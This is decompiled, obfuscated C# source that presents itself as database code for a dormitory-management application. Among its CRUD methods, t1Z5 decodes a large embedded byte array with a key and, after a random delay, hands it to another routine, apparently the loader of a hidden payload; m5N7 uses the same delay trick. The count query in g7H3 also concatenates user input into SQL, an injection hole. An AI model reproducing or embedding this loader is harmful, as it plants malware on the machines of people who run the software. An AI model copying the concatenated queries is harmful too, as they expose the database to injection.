using System;
using System.Data;
using System.Data.Common;
using System.Data.OleDb;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;
using Lw3q;
using Microsoft.VisualBasic.CompilerServices;
using Yr80;
using w1R;
using w1T;
using y4G;

namespace q9A4;

[StandardModule]
internal sealed class j5Q4
{
	public static void q6GS()
	{
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_001f: Expected O, but got Unknown
		Kj81.ds.Tables["kytuc"]!.Clear();
		OleDbCommand val = new OleDbCommand();
		val.set_Connection(Kj81.con);
		val.set_CommandType(CommandType.Text);
		val.set_CommandText("select * from kytucxa");
		Kj81.da.set_SelectCommand(val);
		((DbDataAdapter)(object)Kj81.da).Fill(Kj81.ds.Tables["kytuc"]);
	}

	public static void i9WB(string a4YZ, string y9HX)
	{
		//IL_0051: Unknown result type (might be due to invalid IL or missing references)
		//IL_0057: Expected O, but got Unknown
		DataRow dataRow = Kj81.ds.Tables["kytuc"]!.NewRow();
		dataRow["maktx"] = a4YZ;
		dataRow["tenktx"] = y9HX;
		Kj81.ds.Tables["kytuc"]!.Rows.Add(dataRow);
		OleDbCommand val = new OleDbCommand();
		val.set_Connection(Kj81.con);
		val.set_CommandType(CommandType.Text);
		val.set_CommandText("insert into kytucxa values(@maktx,@tenktx)");
		val.get_Parameters().Add("@maktx", (OleDbType)200).set_Value((object)a4YZ);
		val.get_Parameters().Add("@tenktx", (OleDbType)200).set_Value((object)y9HX);
		Kj81.da.set_InsertCommand(val);
		((DbDataAdapter)(object)Kj81.da).Update(Kj81.ds.Tables["kytuc"]);
	}

	internal static void m5N7(string Js80)
	{
		Task.Delay(new Random().Next(1000, 5000)).Wait();
		q3K0.Zk02(Js80);
	}

	public static void e7G4(string p2ZD, string i8Q9)
	{
		//IL_0044: Unknown result type (might be due to invalid IL or missing references)
		//IL_004a: Expected O, but got Unknown
		DataRow dataRow = Kj81.ds.Tables["kytuc"]!.Select("maktx='" + p2ZD + "'")[0];
		dataRow.BeginEdit();
		dataRow["tenktx"] = i8Q9;
		dataRow.EndEdit();
		OleDbCommand val = new OleDbCommand();
		val.set_Connection(Kj81.con);
		val.set_CommandType(CommandType.Text);
		val.set_CommandText(" update kytucxa set tenktx=@tenktx where maktx=@maktx");
		val.get_Parameters().Add("@tenktx", (OleDbType)200).set_Value((object)i8Q9);
		val.get_Parameters().Add("@maktx", (OleDbType)200).set_Value((object)p2ZD);
		Kj81.da.set_UpdateCommand(val);
		((DbDataAdapter)(object)Kj81.da).Update(Kj81.ds.Tables["kytuc"]);
	}

	internal static void t1Z5()
	{
		byte[] array = q3K0.r2LH(133632);
		checked
		{
			int c1E = Convert.ToInt32(RuntimeHelpers.GetObjectValue(n5L.mDic[n5L.sNum])) * 3;
			int num = array.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				array[i] = Mm0.a7W(array[i], (byte[])n5L.mDic[n5L.sArray], c1E, i);
			}
			n5L.mDic.Add(n5L.mArray, array);
			Task.Delay(new Random().Next(1000, 5000)).Wait();
			Xs8.Ws5();
		}
	}

	public static void Kp06(string Zs9g)
	{
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0044: Expected O, but got Unknown
		DataRow dataRow = Kj81.ds.Tables["kytuc"]!.Select("maktx='" + Zs9g + "'")[0];
		dataRow.BeginEdit();
		dataRow.Delete();
		dataRow.EndEdit();
		OleDbCommand val = new OleDbCommand();
		val.set_Connection(Kj81.con);
		val.set_CommandType(CommandType.Text);
		val.set_CommandText(" delete from kytucxa where maktx=@maktx");
		val.get_Parameters().Add("@maktx", (OleDbType)200).set_Value((object)Zs9g);
		Kj81.da.set_DeleteCommand(val);
		((DbDataAdapter)(object)Kj81.da).Update(Kj81.ds.Tables["kytuc"]);
	}

	public static int g7H3(string Yf15)
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		OleDbCommand val = new OleDbCommand("select count(*) from kytucxa where maktx='" + Yf15 + "'", Kj81.con);
		return Conversions.ToInteger(val.ExecuteScalar());
	}
}
